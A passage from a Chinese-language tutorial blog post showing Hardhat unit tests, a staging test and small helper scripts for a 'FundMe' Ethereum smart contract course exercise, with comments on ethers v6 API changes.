class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br></pre></td><td class="code"><pre><code class="hljs java">const &#123; deployments, ethers, getNamedAccounts &#125; = require(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><br>const &#123; <span class="hljs-keyword">assert</span>, expect &#125; = require(<span class="hljs-string">&quot;chai&quot;</span>);<br><br>const &#123;<br><br>  experimentalAddHardhatNetworkMessageTraceHook,<br><br>&#125; = require(<span class="hljs-string">&quot;hardhat/config&quot;</span>);<br><br>const &#123; developmentChains &#125; = require(<span class="hljs-string">&quot;../../helper-hardhat-config.js&quot;</span>);<br><br>  <br><br><span class="hljs-comment">//describe这里的async要去掉要不然无法运行</span><br><br>!developmentChains.includes(network.name)<br><br>  ? describe.skip<br><br>  : describe(<span class="hljs-string">&quot;fundme&quot;</span>, function () &#123;<br><br>      let fundMe;<br><br>      let deployer;<br><br>      let mockV3Aggregator;<br><br>      <span class="hljs-type">let</span> <span class="hljs-variable">sendValue</span> <span class="hljs-operator">=</span> ethers.parseEther(<span class="hljs-string">&quot;1&quot;</span>);<br><br>      beforeEach(async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>        <span class="hljs-comment">// console.log(sendValue);</span><br><br>        <span class="hljs-comment">//两种获取</span><br><br>        <span class="hljs-comment">//const accounts=await ethers.getSigners()</span><br><br>        <span class="hljs-comment">//const accountZero =accounts[0]</span><br><br>        deployer = (await <span class="hljs-title function_">getNamedAccounts</span><span class="hljs-params">()</span>).deployer;<br><br>        await deployments.fixture([<span class="hljs-string">&quot;all&quot;</span>]);<br><br>        fundMe = await ethers.getContract(<span class="hljs-string">&quot;Fundme&quot;</span>, deployer);<br><br>        mockV3Aggregator = await ethers.getContract(<br><br>          <span class="hljs-string">&quot;MockV3Aggregator&quot;</span>,<br><br>          deployer<br><br>        );<br><br>      &#125;);<br><br>      describe(<span class="hljs-string">&quot;constractor&quot;</span>, function () &#123;<br><br>        it(<span class="hljs-string">&quot;sets the aggregator addresses correctly&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> await fundMe.getPriceFeed();<br><br>          <span class="hljs-comment">//这里因为版本问题需要把address改成target或者getAddress()</span><br><br>          <span class="hljs-keyword">assert</span>.equal(response, mockV3Aggregator.target);<br><br>        &#125;);<br><br>      &#125;);<br><br>      describe(<span class="hljs-string">&quot;fund&quot;</span>, function () &#123;<br><br>        it(<span class="hljs-string">&quot;Fails if you don&#x27;t send enough ETH&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          await <span class="hljs-title function_">expect</span><span class="hljs-params">(fundMe.fund()</span>).to.be.revertedWith(<br><br>            <span class="hljs-string">&quot;You need to speed more ETH&quot;</span><br><br>          );<br><br>        &#125;);<br><br>        it(<span class="hljs-string">&quot;update the amount funded data structure&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          await fundMe.fund(&#123; value: sendValue &#125;);<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> await fundMe.getAddressToAmountFunded(deployer);<br><br>          <span class="hljs-keyword">assert</span>.equal(response.toString(), sendValue.toString());<br><br>        &#125;);<br><br>        it(<span class="hljs-string">&quot;Adds s_funder to array of getFunder&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          await fundMe.fund(&#123; value: sendValue &#125;);<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">s_funder</span> <span class="hljs-operator">=</span> await fundMe.getFunder(<span class="hljs-number">0</span>);<br><br>          <span class="hljs-keyword">assert</span>.equal(s_funder, deployer);<br><br>        &#125;);<br><br>      &#125;);<br><br>      describe(<span class="hljs-string">&quot;withdraw&quot;</span>, function () &#123;<br><br>        beforeEach(async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          await fundMe.fund(&#123; value: sendValue &#125;);<br><br>        &#125;);<br><br>  <br><br>        it(<span class="hljs-string">&quot;Withdraw ETH from a single founder&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">startingFundMeBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            fundMe.getAddress()<br><br>          );<br><br>          <span class="hljs-comment">//console.log(startingFundMeBalance);</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">startingDeployBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            deployer<br><br>          );<br><br>          <span class="hljs-comment">//console.log(startingDeployBalance);</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">transactionResponse</span> <span class="hljs-operator">=</span> await fundMe.Withdraw();<br><br>          <span class="hljs-comment">//这里原本是fundMe.provider.getBalance但是v6变成了现在这样</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">transactionReceipt</span> <span class="hljs-operator">=</span> await transactionResponse.wait();<br><br>          <span class="hljs-comment">//通过调试得知这个不是effectivegasPrice而是gasPrice</span><br><br>          const &#123; gasUsed, gasPrice &#125; = transactionReceipt;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">gasCost</span> <span class="hljs-operator">=</span> gasUsed * gasPrice;<br><br>          <span class="hljs-comment">//console.log(gasCost);</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">endingFundMeBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            fundMe.getAddress()<br><br>          );<br><br>          <span class="hljs-comment">//console.log(endingFundMeBalance);</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">endingDeployerBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            deployer<br><br>          );<br><br>          <span class="hljs-keyword">assert</span>.equal(endingFundMeBalance, <span class="hljs-number">0</span>);<br><br>          <span class="hljs-keyword">assert</span>.equal(<br><br>            (startingFundMeBalance + startingDeployBalance).toString(),<br><br>            (endingDeployerBalance + gasCost).toString()<br><br>          );<br><br>        &#125;);<br><br>        it(<span class="hljs-string">&quot;allows us to withdraw with multiple getFunder&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">accounts</span> <span class="hljs-operator">=</span> await ethers.getSigners();<br><br>          <span class="hljs-keyword">for</span> (<span class="hljs-type">let</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br><br>            <span class="hljs-type">const</span> <span class="hljs-variable">fundMeConnectedContract</span> <span class="hljs-operator">=</span> await fundMe.connect(accounts[i]);<br><br>            await fundMeConnectedContract.fund(&#123; value: sendValue &#125;);<br><br>          &#125;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">startingFundMeBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            fundMe.target<br><br>          );<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">startingDeployerBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            deployer<br><br>          );<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">transactionResponse</span> <span class="hljs-operator">=</span> await fundMe.Withdraw();<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">transactionReceipt</span> <span class="hljs-operator">=</span> await transactionResponse.wait();<br><br>          const &#123; gasUsed, gasPrice &#125; = transactionReceipt;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">gasCost</span> <span class="hljs-operator">=</span> gasUsed * gasPrice;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">endingFundMeBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            fundMe.getAddress()<br><br>          );<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">endingDeployerBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            deployer<br><br>          );<br><br>          <span class="hljs-keyword">assert</span>.equal(endingFundMeBalance, <span class="hljs-number">0</span>);<br><br>          <span class="hljs-keyword">assert</span>.equal(<br><br>            (startingFundMeBalance + startingDeployerBalance).toString(),<br><br>            (endingDeployerBalance + gasCost).toString()<br><br>          );<br><br>          <span class="hljs-comment">//这里的getFunder改成了gets_funder,但是不改好像没问题</span><br><br>          await <span class="hljs-title function_">expect</span><span class="hljs-params">(fundMe.getFunder(<span class="hljs-number">0</span>)</span>).to.be.reverted;<br><br>          <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br><br>            <span class="hljs-keyword">assert</span>.equal(<br><br>              await fundMe.getAddressToAmountFunded(accounts[i].address),<br><br>              <span class="hljs-number">0</span><br><br>            );<br><br>          &#125;<br><br>        &#125;);<br><br>        it(<span class="hljs-string">&quot;Only allows the owner to withdraw&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">accounts</span> <span class="hljs-operator">=</span> await ethers.getSigners();<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">attacker</span> <span class="hljs-operator">=</span> accounts[<span class="hljs-number">1</span>];<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">attackerConnectedContract</span> <span class="hljs-operator">=</span> await fundMe.connect(attacker);<br><br>          <span class="hljs-comment">//这里需要修改revertedWith(&quot;FundMe__NotOwner&quot;)编程下面的样子，可能是因为这是用户自定义错误的问题吧</span><br><br>          await <span class="hljs-title function_">expect</span><span class="hljs-params">(</span><br><span class="hljs-params"></span><br><span class="hljs-params">            attackerConnectedContract.Withdraw()</span><br><br>          ).to.be.revertedWithCustomError(fundMe, <span class="hljs-string">&quot;Fundme__NotOwner&quot;</span>);<br><br>        &#125;);<br><br>      &#125;);<br><br>      describe(<span class="hljs-string">&quot;cheaperwithdraw&quot;</span>, function () &#123;<br><br>        beforeEach(async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          await fundMe.fund(&#123; value: sendValue &#125;);<br><br>        &#125;);<br><br>  <br><br>        it(<span class="hljs-string">&quot;cheaperWithdraw ETH from a single founder&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">startingFundMeBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            fundMe.getAddress()<br><br>          );<br><br>          <span class="hljs-comment">//console.log(startingFundMeBalance);</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">startingDeployBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            deployer<br><br>          );<br><br>          <span class="hljs-comment">//console.log(startingDeployBalance);</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">transactionResponse</span> <span class="hljs-operator">=</span> await fundMe.cheaperWithdraw();<br><br>          <span class="hljs-comment">//这里原本是fundMe.provider.getBalance但是v6变成了现在这样</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">transactionReceipt</span> <span class="hljs-operator">=</span> await transactionResponse.wait();<br><br>          <span class="hljs-comment">//通过调试得知这个不是effectivegasPrice而是gasPrice</span><br><br>          const &#123; gasUsed, gasPrice &#125; = transactionReceipt;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">gasCost</span> <span class="hljs-operator">=</span> gasUsed * gasPrice;<br><br>          <span class="hljs-comment">//console.log(gasCost);</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">endingFundMeBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            fundMe.getAddress()<br><br>          );<br><br>          <span class="hljs-comment">//console.log(endingFundMeBalance);</span><br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">endingDeployerBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            deployer<br><br>          );<br><br>          <span class="hljs-keyword">assert</span>.equal(endingFundMeBalance, <span class="hljs-number">0</span>);<br><br>          <span class="hljs-keyword">assert</span>.equal(<br><br>            (startingFundMeBalance + startingDeployBalance).toString(),<br><br>            (endingDeployerBalance + gasCost).toString()<br><br>          );<br><br>        &#125;);<br><br>        it(<span class="hljs-string">&quot;allows us to cheaperwithdraw with multiple getFunder&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">accounts</span> <span class="hljs-operator">=</span> await ethers.getSigners();<br><br>          <span class="hljs-keyword">for</span> (<span class="hljs-type">let</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br><br>            <span class="hljs-type">const</span> <span class="hljs-variable">fundMeConnectedContract</span> <span class="hljs-operator">=</span> await fundMe.connect(accounts[i]);<br><br>            await fundMeConnectedContract.fund(&#123; value: sendValue &#125;);<br><br>          &#125;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">startingFundMeBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            fundMe.target<br><br>          );<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">startingDeployerBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            deployer<br><br>          );<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">transactionResponse</span> <span class="hljs-operator">=</span> await fundMe.cheaperWithdraw();<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">transactionReceipt</span> <span class="hljs-operator">=</span> await transactionResponse.wait();<br><br>          const &#123; gasUsed, gasPrice &#125; = transactionReceipt;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">gasCost</span> <span class="hljs-operator">=</span> gasUsed * gasPrice;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">endingFundMeBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            fundMe.getAddress()<br><br>          );<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">endingDeployerBalance</span> <span class="hljs-operator">=</span> await ethers.provider.getBalance(<br><br>            deployer<br><br>          );<br><br>          <span class="hljs-keyword">assert</span>.equal(endingFundMeBalance, <span class="hljs-number">0</span>);<br><br>          <span class="hljs-keyword">assert</span>.equal(<br><br>            (startingFundMeBalance + startingDeployerBalance).toString(),<br><br>            (endingDeployerBalance + gasCost).toString()<br><br>          );<br><br>          <span class="hljs-comment">//这里的getFunder改成了gets_funder,但是不改好像没问题</span><br><br>          await <span class="hljs-title function_">expect</span><span class="hljs-params">(fundMe.getFunder(<span class="hljs-number">0</span>)</span>).to.be.reverted;<br><br>          <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br><br>            <span class="hljs-keyword">assert</span>.equal(<br><br>              await fundMe.getAddressToAmountFunded(accounts[i].address),<br><br>              <span class="hljs-number">0</span><br><br>            );<br><br>          &#125;<br><br>        &#125;);<br><br>        it(<span class="hljs-string">&quot;Only allows the owner to cheaperwithdraw&quot;</span>, async <span class="hljs-title function_">function</span> <span class="hljs-params">()</span> &#123;<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">accounts</span> <span class="hljs-operator">=</span> await ethers.getSigners();<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">attacker</span> <span class="hljs-operator">=</span> accounts[<span class="hljs-number">1</span>];<br><br>          <span class="hljs-type">const</span> <span class="hljs-variable">attackerConnectedContract</span> <span class="hljs-operator">=</span> await fundMe.connect(attacker);<br><br>          <span class="hljs-comment">//这里需要修改revertedWith(&quot;FundMe__NotOwner&quot;)编程下面的样子，可能是因为这是用户自定义错误的问题吧</span><br><br>          await <span class="hljs-title function_">expect</span><span class="hljs-params">(</span><br><span class="hljs-params"></span><br><span class="hljs-params">            attackerConnectedContract.Withdraw()</span><br><br>          ).to.be.revertedWithCustomError(fundMe, <span class="hljs-string">&quot;Fundme__NotOwner&quot;</span>);<br><br>        &#125;);<br><br>      &#125;);<br><br>    &#125;);<br></code></pre></td></tr></table></figure><h3 id="集成测试"><a href="#集成测试" class="headerlink" title="集成测试"></a>集成测试</h3><p>因为是在线上环境测试，这里比较容易出现的问题就是钱包里的钱不够，你需要把那个parseETH里面的数字改成0.1个eth</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> &#123; getNamedAccounts, ethers, network &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><br><span class="hljs-keyword">const</span> &#123; developmentChains &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../../helper-hardhat-config.js&quot;</span>);<br><br><span class="hljs-keyword">const</span> &#123;<br><br>  isCallTrace,<br><br>&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;hardhat/internal/hardhat-network/stack-traces/message-trace&quot;</span>);<br><br><span class="hljs-keyword">const</span> &#123; assert &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;chai&quot;</span>);<br><br>  <br><br>developmentChains.<span class="hljs-title function_">includes</span>(network.<span class="hljs-property">name</span>)<br><br>  ? describe.<span class="hljs-property">skip</span><br><br>  : <span class="hljs-title function_">describe</span>(<span class="hljs-string">&quot;Fundme&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>      <span class="hljs-keyword">let</span> fundMe;<br><br>      <span class="hljs-keyword">let</span> deployer;<br><br>      <span class="hljs-comment">//这里原本时ethers.utils.parseEther</span><br><br>      <span class="hljs-keyword">const</span> sendValue = ethers.<span class="hljs-title function_">parseEther</span>(<span class="hljs-string">&quot;0.05&quot;</span>);<br><br>      <span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>        deployer = (<span class="hljs-keyword">await</span> <span class="hljs-title function_">getNamedAccounts</span>()).<span class="hljs-property">deployer</span>;<br><br>        fundMe = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContract</span>(<span class="hljs-string">&quot;Fundme&quot;</span>, deployer);<br><br>      &#125;);<br><br>      <span class="hljs-title function_">it</span>(<span class="hljs-string">&quot;allows people to fund and withdraw&quot;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><br>        <span class="hljs-keyword">await</span> fundMe.<span class="hljs-title function_">fund</span>(&#123; <span class="hljs-attr">value</span>: sendValue &#125;);<br><br>        <span class="hljs-keyword">await</span> fundMe.<span class="hljs-title function_">cheaperWithdraw</span>();<br><br>        <span class="hljs-keyword">const</span> endingBalance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-property">provider</span>.<span class="hljs-title function_">getBalance</span>(fundMe.<span class="hljs-property">target</span>);<br><br>        assert.<span class="hljs-title function_">equal</span>(endingBalance.<span class="hljs-title function_">toString</span>(), <span class="hljs-string">&quot;0&quot;</span>);<br><br>      &#125;);<br><br>    &#125;);<br></code></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="快速脚本"><a href="#快速脚本" class="headerlink" title="快速脚本"></a>快速脚本</h2><p>这里我在跟课程的时候写的，但是并不知道有什么用</p><h3 id="fundme"><a href="#fundme" class="headerlink" title="fundme"></a>fundme</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs awk">const &#123; getNamedAccount, ethers, getNamedAccounts &#125; = require(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><br>  <br><br>async <span class="hljs-keyword">function</span> main() &#123;<br><br>  const &#123; deployer &#125; = await getNamedAccounts();<br><br>  const fundMe = await ethers.getContract(<span class="hljs-string">&quot;Fundme&quot;</span>, deployer);<br><br>  console.log(<span class="hljs-string">&quot;Funding Contract...&quot;</span>);<br><br>  const transactionResponse = await fundMe.fund(&#123;<br><br>    value: ethers.parseEther(<span class="hljs-string">&quot;0.1&quot;</span>),<br><br>  &#125;);<br><br>  await transactionResponse.wait(<span class="hljs-number">1</span>);<br><br>  console.log(<span class="hljs-string">&quot;funded&quot;</span>);<br><br>&#125;<br><br>  <br><br>main()<br><br>  .then(() =&gt; process.<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>))<br><br>  .catch((error) =&gt; &#123;<br><br>    console.error(error);<br><br>    process.<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br><br>  &#125;);<br></code></pre></td></tr></table></figure><h3 id="withdraw"><a href="#withdraw" class="headerlink" title="withdraw"></a>withdraw</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 